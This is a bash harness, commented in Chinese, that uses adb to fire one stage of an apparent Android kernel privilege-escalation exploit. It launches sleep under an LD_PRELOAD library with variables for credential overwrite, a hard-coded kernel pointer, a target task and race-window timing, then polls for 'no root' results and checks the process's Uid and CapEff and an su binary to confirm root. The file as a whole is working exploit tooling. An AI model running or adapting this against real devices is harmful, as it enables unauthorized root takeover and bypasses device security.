#!/usr/bin/env bash
# ctest.sh — 零 R 的 C 诊断: 在「R 轮早已结束、只剩 landed child」的状态下补打一发 C,
# 检查 mt19b 时刻是否回到窗口内(历史成功是 t=8986ms; 我们之前是 t=2001x ms 被护栏掐掉)。
set -u
ADB="${ADB:-/c/Users/<user>/Desktop/matisse/platform-tools_r33.0.2-windows/platform-tools/adb.exe}"
export ANDROID_ADB_LOG_PATH="${ANDROID_ADB_LOG_PATH:-/c/Users/<user>/Desktop/matisse/.adb/adb.log}"
say(){ printf '[ctest %s] %s\n' "$(date +%H:%M:%S)" "$*"; }
ash(){ "$ADB" shell "$1" 2>/dev/null | tr -d '\r'; }

ST=$(ash "cat /data/local/tmp/mt49_child_status.txt")
TASK=$(printf '%s' "$ST" | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
say "当前门槛: $ST"
[ -n "$TASK" ] || { say "!! 没有 task (R 未落地) — 本实验不适用"; exit 1; }
say "TASK=$TASK"
say "开火前的 sleep 进程: $(ash 'pgrep -x sleep | tr "\n" " "')"

ash "rm -f /data/local/tmp/Cdiag.out" >/dev/null
CMD="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_TASK=$TASK PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/Cdiag.out 2>&1"
say "补打 C (TASK=$TASK, WINDOW=20) ..."
( /usr/bin/timeout 280 "$ADB" shell "$CMD" >/dev/null 2>&1 ) &
CPID=$!

V=""
for i in $(seq 1 24); do
  sleep 5
  V=$(ash "grep -aoE 'mid-burst landing|window closed mid-burst|storm done at t=[0-9]+ms|no root after [0-9]+ attempts' /data/local/tmp/Cdiag.out 2>/dev/null | tail -1")
  [ -n "$V" ] && { say "判据出现(第 $((i*5))s): $V"; break; }
done
kill "$CPID" 2>/dev/null; wait "$CPID" 2>/dev/null

say "=== Cdiag.out 关键行 ==="
ash "grep -aE 'mt48: PTR|mt77|mt82: consumer|mt60: owner|mt19b|mt25:|mt66:|no root after' /data/local/tmp/Cdiag.out | head -16" | while IFS= read -r L; do say "  $L"; done

say "=== 落地判据: 直接读 sleep 进程的 /proc/<pid>/status (9/08 成功就是靠这个) ==="
for p in $(ash "pgrep -x sleep | tr '\n' ' '"); do
  say "  --- pid=$p ---"
  ash "cat /proc/$p/status 2>/dev/null | grep -E '^(Name|State|Uid|Gid|CapEff)'" | while IFS= read -r L; do say "    $L"; done
done
say "root_alive=[$(ash 'cat /data/local/tmp/root_alive.txt 2>/dev/null')] su=$(ash 'ls /data/local/tmp/su 2>/dev/null || echo no')"
say "门槛(更新后): $(ash 'cat /data/local/tmp/mt49_child_status.txt')"
